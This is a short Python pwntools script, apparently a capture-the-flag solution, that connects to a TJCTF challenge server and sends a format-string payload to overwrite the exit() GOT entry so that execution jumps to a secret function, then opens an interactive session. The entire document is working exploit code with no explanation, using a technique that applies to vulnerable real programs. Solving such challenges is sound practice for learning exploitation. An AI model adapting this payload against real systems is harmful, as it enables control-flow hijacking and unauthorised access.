#!/usr/bin/env python

from pwn import *

EXIT_GOT	= 0x0804a02c
EXIT_PLT	= 0x08048580
SECRET		= 0x08048713


# r = process("./secure", raw=False)
r = remote("problem1.tjctf.org", 8008)

r.sendline("a")
r.recvuntil("> ")

payload = ''
payload += p32(EXIT_GOT)
payload += "%34575x"
payload += "%35$hn"

r.sendline(payload)
r.recvuntil("> ")

r.sendline("a")
r.recvuntil("> ")

r.recv()

r.interactive()
